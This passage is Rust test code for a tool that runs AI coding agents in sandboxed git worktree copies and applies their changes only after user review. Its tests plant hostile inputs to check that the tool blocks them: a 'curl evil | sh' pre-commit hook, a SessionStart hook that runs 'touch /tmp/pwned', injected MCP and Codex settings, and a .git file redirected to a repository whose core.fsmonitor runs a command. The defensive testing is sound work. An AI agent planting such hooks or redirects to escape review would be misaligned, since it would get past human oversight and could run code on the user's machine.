        // The user's folder never changed.
        assert_eq!(read(&root.join("a.txt")), "one\ntwo\nmine\n");
        assert_eq!(read(&root.join("b.txt")), "keep\n");

        remove(&root, &bots, &copy.path, BRANCH).unwrap();
        assert!(!copy_path.exists());
        let branches = race::text(race::run(&root, &["branch", "--list", "aven/bot/*"]).unwrap());
        assert!(branches.is_empty(), "{branches}");
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
    }

    // Bots are not offered on Windows (Claude Code's sandbox does not run
    // there), and these drive real worktrees through canonical macOS paths.
    #[cfg(not(windows))]
    #[test]
    fn reads_applies_and_throws_away_a_fix() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        let synced = sync(&root, &bots, &copy.path, BRANCH).unwrap();
        assert!(!synced.uncommitted);

        std::fs::write(copy_path.join("a.txt"), "one\ntwo\nfixed\n").unwrap();
        std::fs::write(copy_path.join("new.txt"), "fresh\n").unwrap();
        let reviewed = diff(&bots, &copy.path, &synced.base).unwrap();
        let changes = &reviewed.changes;
        let mut files: Vec<_> = changes
            .files
            .iter()
            .map(|file| (file.path.as_str(), file.status.as_str()))
            .collect();
        files.sort();
        assert_eq!(files, vec![("a.txt", "modified"), ("new.txt", "added")]);
        assert_eq!(changes.additions, 2);
        let shown = file_diff(&bots, &copy.path, &synced.base, "a.txt").unwrap();
        assert_eq!(shown.original.as_deref(), Some("one\ntwo\n"));
        assert_eq!(shown.current.as_deref(), Some("one\ntwo\nfixed\n"));
        // Nothing reached the user's folder before Apply.
        assert_eq!(read(&root.join("a.txt")), "one\ntwo\n");
        assert!(!root.join("new.txt").exists());

        // A change after the user looked is never applied unseen, even one
        // with the same files and line counts.
        std::fs::write(copy_path.join("a.txt"), "one\ntwo\nFIXED\n").unwrap();
        let later = diff(&bots, &copy.path, &synced.base).unwrap();
        assert_eq!(later.changes.additions, reviewed.changes.additions);
        assert_ne!(later.hash, reviewed.hash);
        let error = apply(&root, &bots, &copy.path, &synced.base, &reviewed.hash).unwrap_err();
        assert_eq!(error, FIX_CHANGED);
        assert_eq!(read(&root.join("a.txt")), "one\ntwo\n");
        std::fs::write(copy_path.join("a.txt"), "one\ntwo\nfixed\n").unwrap();

        let applied = apply(&root, &bots, &copy.path, &synced.base, &reviewed.hash).unwrap();
        assert_eq!(applied.files.len(), 2);
        assert_eq!(read(&root.join("a.txt")), "one\ntwo\nfixed\n");
        assert_eq!(read(&root.join("new.txt")), "fresh\n");

        // Throw away: the copy goes back to the base.
        discard(&bots, &copy.path, &synced.base, BRANCH).unwrap();
        assert_eq!(read(&copy_path.join("a.txt")), "one\ntwo\n");
        assert!(!copy_path.join("new.txt").exists());
        assert!(diff(&bots, &copy.path, &synced.base)
            .unwrap()
            .changes
            .files
            .is_empty());

        remove(&root, &bots, &copy.path, BRANCH).unwrap();
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
    }

    // Bots are not offered on Windows (Claude Code's sandbox does not run
    // there), and these drive real worktrees through canonical macOS paths.
    #[cfg(not(windows))]
    #[test]
    fn a_conflicting_apply_changes_nothing_and_keeps_the_fix() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        let synced = sync(&root, &bots, &copy.path, BRANCH).unwrap();
        std::fs::write(copy_path.join("a.txt"), "bot\n").unwrap();
        std::fs::write(copy_path.join("b.txt"), "bot b\n").unwrap();
        // The user edited a.txt after the bot's copy was synced.
        std::fs::write(root.join("a.txt"), "user\n").unwrap();
        let hash = diff(&bots, &copy.path, &synced.base).unwrap().hash;
        let error = apply(&root, &bots, &copy.path, &synced.base, &hash).unwrap_err();
        assert!(error.contains("conflict"), "{error}");
        assert_eq!(read(&root.join("a.txt")), "user\n");
        assert_eq!(read(&root.join("b.txt")), "keep\n");
        // The fix is still there to try again.
        assert_eq!(
            diff(&bots, &copy.path, &synced.base)
                .unwrap()
                .changes
                .files
                .len(),
            2
        );
        remove(&root, &bots, &copy.path, BRANCH).unwrap();
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
    }

    // Bots are not offered on Windows (Claude Code's sandbox does not run
    // there), and these drive real worktrees through canonical macOS paths.
    #[cfg(not(windows))]
    #[test]
    fn makes_a_forgotten_copy_again() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        // Something deleted the folder behind git's back.
        std::fs::remove_dir_all(&copy_path).unwrap();
        let again = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        assert_eq!(again, copy);
        assert_eq!(read(&copy_path.join("a.txt")), "one\ntwo\n");
        // A leftover folder git never knew is replaced too.
        remove(&root, &bots, &copy.path, BRANCH).unwrap();
        std::fs::create_dir_all(&copy_path).unwrap();
        std::fs::write(copy_path.join("junk.txt"), "x").unwrap();
        ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        assert!(!copy_path.join("junk.txt").exists());
        assert!(copy_path.join("a.txt").is_file());
        remove(&root, &bots, &copy.path, BRANCH).unwrap();
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
    }

    #[test]
    fn refuses_folders_that_are_not_projects_and_bad_input() {
        let plain = temp_dir("plain");
        let bots = temp_dir("bots");
        let key = plain.to_string_lossy().to_string();
        let error = ensure_copy(&plain, &bots, &key, BRANCH).unwrap_err();
        assert!(error.contains("git repository"), "{error}");
        git_ok(&plain, &["init", "-q"]);
        let error = ensure_copy(&plain, &bots, &key, BRANCH).unwrap_err();
        assert!(error.contains("commit"), "{error}");

        assert!(ensure_copy(&plain, &bots, &key, "main").is_err());
        assert!(ensure_copy(&plain, &bots, &key, "aven/bot/../x").is_err());
        assert!(ensure_copy(&plain, &bots, &key, "aven/bot/Jelly").is_err());
        assert!(sync(&plain, &bots, "/etc", BRANCH).is_err());
        assert!(diff(&bots, &bots.to_string_lossy(), &"a".repeat(40)).is_err());
        assert!(diff(&bots, &format!("{}/../x", bots.display()), &"a".repeat(40)).is_err());
        assert!(discard(&bots, "/tmp/elsewhere", &"a".repeat(40), BRANCH).is_err());
        // Only a folder directly inside bots/, and only a checkout of its own.
        let nested = bots.join("a").join("b");
        std::fs::create_dir_all(&nested).unwrap();
        assert!(diff(&bots, &nested.to_string_lossy(), &"a".repeat(40)).is_err());
        let loose = bots.join("loose");
        std::fs::create_dir_all(&loose).unwrap();
        let error = sync(&plain, &bots, &loose.to_string_lossy(), BRANCH).unwrap_err();
        assert!(error.contains("missing"), "{error}");
        let _ = std::fs::remove_dir_all(&plain);
        let _ = std::fs::remove_dir_all(&bots);
    }

    #[test]
    fn says_why_a_folder_cannot_have_a_bot_yet() {
        let plain = temp_dir("ready");
        assert_eq!(
            project_ready(&plain.join("gone")).unwrap_err(),
            MISSING_PROJECT
        );
        let error = project_ready(&plain).unwrap_err();
        assert!(error.contains("needs a git repository"), "{error}");
        git_ok(&plain, &["init", "-q"]);
        let error = project_ready(&plain).unwrap_err();
        assert!(error.contains("needs at least one commit"), "{error}");
        let _ = std::fs::remove_dir_all(&plain);
    }

    // Settings an agent wrote into the copy never stay: Claude's project
    // and local settings (where hooks live) and MCP servers, even ignored.
    #[cfg(not(windows))]
    #[test]
    fn removes_settings_an_agent_planted_in_the_copy() {
        let root = repo();
        std::fs::write(
            root.join(".gitignore"),
            "node_modules/\n.claude/settings.local.json\n",
        )
        .unwrap();
        std::fs::create_dir_all(root.join(".claude")).unwrap();
        // The project's own committed settings are its own.
        std::fs::write(root.join(".claude/settings.json"), "{}\n").unwrap();
        git_ok(&root, &["add", "-A"]);
        git_ok(&root, &["commit", "-q", "-m", "settings"]);
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        let synced = sync(&root, &bots, &copy.path, BRANCH).unwrap();
        assert!(synced.planted.is_empty(), "{:?}", synced.planted);
        assert!(planted(&bots, &copy.path, false).unwrap().is_empty());

        let hook = r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch /tmp/pwned"}]}]}}"#;
        std::fs::write(copy_path.join(".claude/settings.local.json"), hook).unwrap();
        std::fs::write(copy_path.join(".claude/settings.json"), hook).unwrap();
        std::fs::write(copy_path.join(".mcp.json"), "{}").unwrap();
        let mut found = planted(&bots, &copy.path, false).unwrap();
        found.sort();
        assert_eq!(
            found,
            vec![
                ".claude/settings.json",
                ".claude/settings.local.json",
                ".mcp.json"
            ]
        );
        // Removing puts the committed one back and deletes the others.
        planted(&bots, &copy.path, true).unwrap();
        assert!(!copy_path.join(".claude/settings.local.json").exists());
        assert!(!copy_path.join(".mcp.json").exists());
        assert_eq!(read(&copy_path.join(".claude/settings.json")), "{}\n");

        // A sync removes them too, and says which.
        std::fs::write(copy_path.join(".claude/settings.local.json"), hook).unwrap();
        let synced = sync(&root, &bots, &copy.path, BRANCH).unwrap();
        assert_eq!(synced.planted, vec![".claude/settings.local.json"]);
        assert!(!copy_path.join(".claude/settings.local.json").exists());
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
    }

    // Codex's project settings and hooks are swept too, whatever their case;
    // a settings folder that is a link stops the turn; and a fix that
    // changes settings or hook folders is never applied to your files.
    #[cfg(not(windows))]
    #[test]
    fn sweeps_codex_settings_refuses_links_and_keeps_settings_out_of_apply() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        let synced = sync(&root, &bots, &copy.path, BRANCH).unwrap();

        std::fs::create_dir_all(copy_path.join(".codex")).unwrap();
        std::fs::write(copy_path.join(".codex/config.toml"), "[mcp_servers.x]\n").unwrap();
        std::fs::write(copy_path.join(".codex/hooks.json"), "{}").unwrap();
        std::fs::create_dir_all(copy_path.join(".CLAUDE")).unwrap();
        std::fs::write(copy_path.join(".CLAUDE/Settings.Local.json"), "{}").unwrap();
        let mut found = planted(&bots, &copy.path, true).unwrap();
        found.sort();
        assert_eq!(found.len(), 3, "{found:?}");
        assert!(found
            .iter()
            .any(|path| path.eq_ignore_ascii_case(".claude/settings.local.json")));
        assert!(!copy_path.join(".codex/config.toml").exists());
        assert!(!copy_path.join(".codex/hooks.json").exists());
        assert!(!copy_path.join(".CLAUDE/Settings.Local.json").exists());
        let _ = std::fs::remove_dir_all(copy_path.join(".CLAUDE"));
        let _ = std::fs::remove_dir_all(copy_path.join(".codex"));

        // A settings folder that is a link: the turn doesn't start.
        let elsewhere = temp_dir("elsewhere");
        std::os::unix::fs::symlink(&elsewhere, copy_path.join(".vscode")).unwrap();
        let error = planted(&bots, &copy.path, false).unwrap_err();
        assert!(
            error.contains(".vscode in the bot's copy is a link"),
            "{error}"
        );
        std::fs::remove_file(copy_path.join(".vscode")).unwrap();

        // A fix touching a hook manager's folder isn't applied.
        std::fs::create_dir_all(copy_path.join(".husky")).unwrap();
        std::fs::write(copy_path.join(".husky/pre-commit"), "curl evil | sh\n").unwrap();
        std::fs::write(copy_path.join("a.txt"), "one\ntwo\nfixed\n").unwrap();
        let reviewed = diff(&bots, &copy.path, &synced.base).unwrap();
        let error = apply(&root, &bots, &copy.path, &synced.base, &reviewed.hash).unwrap_err();
        assert!(error.starts_with(PROTECTED_FIX), "{error}");
        assert!(error.contains(".husky/pre-commit"), "{error}");
        assert_eq!(read(&root.join("a.txt")), "one\ntwo\n");
        assert!(!root.join(".husky").exists());
        assert_eq!(
            protected_paths(&[
                "src/a.ts",
                ".Claude/settings.json",
                ".MCP.json",
                "docs/.claude.md"
            ]),
            vec![".Claude/settings.json", ".MCP.json"]
        );
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
        let _ = std::fs::remove_dir_all(&elsewhere);
    }

    // A copy whose `.git` file was pointed at another repository (one an
    // agent made, whose configuration would run its programs) is refused
    // before git runs there.
    #[cfg(not(windows))]
    #[test]
    fn refuses_a_copy_pointed_at_another_repository() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        let synced = sync(&root, &bots, &copy.path, BRANCH).unwrap();
        assert!(diff(&bots, &copy.path, &synced.base).is_ok());

        // A planted repository with a file-system monitor that would run.
        let evil = temp_dir("evil");
        git_ok(&evil, &["init", "-q"]);
        let marker = evil.join("ran");
        git_ok(
            &evil,
            &[
                "config",
                "core.fsmonitor",
                &format!("touch {}", marker.display()),
            ],
        );
        std::fs::create_dir_all(evil.join(".git/worktrees/x")).unwrap();
        let dot_git = copy_path.join(".git");
        let original = read(&dot_git);
        std::fs::write(
            &dot_git,
            format!("gitdir: {}\n", evil.join(".git/worktrees/x").display()),
        )
        .unwrap();
        let error = diff(&bots, &copy.path, &synced.base).unwrap_err();
        assert_eq!(error, FOREIGN_COPY);
        assert!(planted(&bots, &copy.path, true).is_err());
        assert!(!marker.exists());
        // A `.git` that is a folder, or a link, is refused as well.
        std::fs::remove_file(&dot_git).unwrap();
        std::fs::create_dir(&dot_git).unwrap();
        assert_eq!(
            diff(&bots, &copy.path, &synced.base).unwrap_err(),
            MISSING_COPY
        );
        std::fs::remove_dir(&dot_git).unwrap();
        std::fs::write(&dot_git, original).unwrap();
        assert!(diff(&bots, &copy.path, &synced.base).is_ok());
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
        let _ = std::fs::remove_dir_all(&evil);
    }

    #[test]
    fn names_copies_by_project() {
        let a = copy_dir_name("/Users/me/Orbit");
        let b = copy_dir_name("/Users/someone/Orbit");
        assert!(a.starts_with("orbit-"), "{a}");
        assert_ne!(a, b);
        assert_eq!(a, copy_dir_name("/Users/me/Orbit/"));
        assert!(copy_dir_name("/").starts_with("project-"));
        assert!(copy_dir_name("/x/Héllo Wörld!").starts_with("h-llo-w-rld-"));
        assert!(valid_branch("aven/bot/jelly-2"));
        assert!(!valid_branch("aven/race/x"));
        assert!(!valid_branch("aven/bot/"));
    }

    // A crew's stack: cards commit on its branch, the user's folder changes
    // only through Apply, by exactly the reviewed range.
    #[cfg(not(windows))]
    #[test]
    fn stacks_cards_and_applies_exactly_the_reviewed_range() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        let base = sync(&root, &bots, &copy.path, BRANCH).unwrap().base;

        // Card 1 passes its checks: stacked on the branch.
        std::fs::write(copy_path.join("a.txt"), "one\ntwo\ncard one\n").unwrap();
        std::fs::write(copy_path.join("new.txt"), "fresh\n").unwrap();
        let first = stack(&bots, &copy.path, BRANCH, &base, "Timer screen").unwrap();
        assert_ne!(first, base);
        let branch_head =
            race::text(race::run(&root, &["rev-parse", &format!("refs/heads/{BRANCH}")]).unwrap());
        assert_eq!(branch_head, first);
        // Nothing is left over in the copy once stacked.
        assert!(diff(&bots, &copy.path, &first)
            .unwrap()
            .changes
            .files
            .is_empty());
        // Its commit is Aven's, not the user's identity.
        let author =
            race::text(race::run(&root, &["log", "-1", "--format=%an <%ae> %s", &first]).unwrap());
        assert_eq!(author, "Aven crew <crew@aven.invalid> Crew: Timer screen");

        // Card 2 builds on top of it; stacking needs its starting point.
        std::fs::write(copy_path.join("b.txt"), "keep\ncard two\n").unwrap();
        assert_eq!(
            stack(&bots, &copy.path, BRANCH, &base, "Wrong parent").unwrap_err(),
            STACK_MOVED
        );
        let second = stack(&bots, &copy.path, BRANCH, &first, "Settings page").unwrap();

        // Each card's own change, and the combined one.
        let own = range(&bots, &copy.path, &first, &second).unwrap();
        assert_eq!(
            own.changes
                .files
                .iter()
                .map(|f| f.path.as_str())
                .collect::<Vec<_>>(),
            vec!["b.txt"]
        );
        let combined = range(&bots, &copy.path, &base, &second).unwrap();
        let mut paths: Vec<_> = combined
            .changes
            .files
            .iter()
            .map(|f| f.path.clone())
            .collect();
        paths.sort();
        assert_eq!(paths, vec!["a.txt", "b.txt", "new.txt"]);
        let shown = range_file_diff(&bots, &copy.path, &base, &second, "b.txt").unwrap();
        assert_eq!(shown.original.as_deref(), Some("keep\n"));
        assert_eq!(shown.current.as_deref(), Some("keep\ncard two\n"));
        // A range backwards, or not on the stack, is refused.
        assert!(range(&bots, &copy.path, &second, &base).is_err());

        // A card at work on top changes nothing about the reviewed range.
        std::fs::write(copy_path.join("a.txt"), "in progress\n").unwrap();
        // Nothing reached the user's folder before Apply.
        assert_eq!(read(&root.join("a.txt")), "one\ntwo\n");
        // Only the reviewed fingerprint lands.
        assert_eq!(
            apply_range(&root, &bots, &copy.path, &base, &second, "nope").unwrap_err(),
            FIX_CHANGED
        );
        assert_eq!(read(&root.join("a.txt")), "one\ntwo\n");
        // Applying up to card 1 lands card 1 alone.
        let up_to = range(&bots, &copy.path, &base, &first).unwrap();
        apply_range(&root, &bots, &copy.path, &base, &first, &up_to.hash).unwrap();
        assert_eq!(read(&root.join("a.txt")), "one\ntwo\ncard one\n");
        assert_eq!(read(&root.join("b.txt")), "keep\n");
        // Then the rest, from where the user now is.
        let rest = range(&bots, &copy.path, &first, &second).unwrap();
        apply_range(&root, &bots, &copy.path, &first, &second, &rest.hash).unwrap();
        assert_eq!(read(&root.join("b.txt")), "keep\ncard two\n");
        assert_eq!(read(&root.join("new.txt")), "fresh\n");
        // The in-progress work stayed in the copy, never in the user's folder.
        assert_eq!(read(&copy_path.join("a.txt")), "in progress\n");

        remove(&root, &bots, &copy.path, BRANCH).unwrap();
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
    }

    #[cfg(not(windows))]
    #[test]
    fn never_applies_protected_paths_from_a_stack() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        let base = sync(&root, &bots, &copy.path, BRANCH).unwrap().base;
        std::fs::create_dir_all(copy_path.join(".husky")).unwrap();
        std::fs::write(copy_path.join(".husky/pre-commit"), "curl evil\n").unwrap();
        let top = stack(&bots, &copy.path, BRANCH, &base, "Hooks").unwrap();
        let reviewed = range(&bots, &copy.path, &base, &top).unwrap();
        let error = apply_range(&root, &bots, &copy.path, &base, &top, &reviewed.hash).unwrap_err();
        assert!(error.starts_with(PROTECTED_FIX), "{error}");
        assert!(!root.join(".husky").exists());
        remove(&root, &bots, &copy.path, BRANCH).unwrap();
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
    }

    #[cfg(not(windows))]
    #[test]
    fn restacks_onto_the_users_files_or_keeps_the_stack_as_it_was() {
        let root = repo();
        let bots = temp_dir("bots");
        let key = root.to_string_lossy().to_string();
        let copy = ensure_copy(&root, &bots, &key, BRANCH).unwrap();
        let copy_path = PathBuf::from(&copy.path);
        let base = sync(&root, &bots, &copy.path, BRANCH).unwrap().base;
        std::fs::write(copy_path.join("a.txt"), "one\ntwo\ncard one\n").unwrap();
        let first = stack(&bots, &copy.path, BRANCH, &base, "One").unwrap();
        std::fs::write(copy_path.join("new.txt"), "card two\n").unwrap();
        let second = stack(&bots, &copy.path, BRANCH, &first, "Two").unwrap();

        // The user moved on elsewhere in the file: the stack replays on top.
        std::fs::write(root.join("b.txt"), "keep\nmine\n").unwrap();
        let moved = restack(
            &root,
            &bots,
            &copy.path,
            BRANCH,
            &base,
            &[first.clone(), second.clone()],
        )
        .unwrap();
        assert_eq!(moved.commits.len(), 2);
        assert_ne!(moved.base, base);
        assert_eq!(read(&copy_path.join("a.txt")), "one\ntwo\ncard one\n");
        assert_eq!(read(&copy_path.join("b.txt")), "keep\nmine\n");
        assert_eq!(read(&copy_path.join("new.txt")), "card two\n");
        let own = range(&bots, &copy.path, &moved.commits[0], &moved.commits[1]).unwrap();
        assert_eq!(own.changes.files.len(), 1);
        assert_eq!(own.changes.files[0].path, "new.txt");

        // The user rewrote the very lines card one changed: nothing is lost.
        std::fs::write(root.join("a.txt"), "rewritten\n").unwrap();
        let error = restack(
            &root,
            &bots,
            &copy.path,
            BRANCH,
            &moved.base,
            &moved.commits,
        )
        .unwrap_err();
        assert!(error.starts_with(RESTACK_CONFLICT), "{error}");
        assert!(error.contains("card 1 of 2"), "{error}");
        assert_eq!(head(&copy_path).unwrap(), moved.commits[1]);
        assert_eq!(read(&copy_path.join("a.txt")), "one\ntwo\ncard one\n");
        assert_eq!(read(&copy_path.join("new.txt")), "card two\n");
        // A card at work in the copy stops a restack.
        std::fs::write(copy_path.join("wip.txt"), "busy\n").unwrap();
        assert!(restack(
            &root,
            &bots,
            &copy.path,
            BRANCH,
            &moved.base,
            &moved.commits
        )
        .is_err());
        assert!(copy_path.join("wip.txt").is_file());
        // The user's folder never changed through any of it.
        assert_eq!(read(&root.join("a.txt")), "rewritten\n");
        assert!(!root.join("new.txt").exists());

        remove(&root, &bots, &copy.path, BRANCH).unwrap();
        let _ = std::fs::remove_dir_all(&root);
        let _ = std::fs::remove_dir_all(&bots);
    }
}
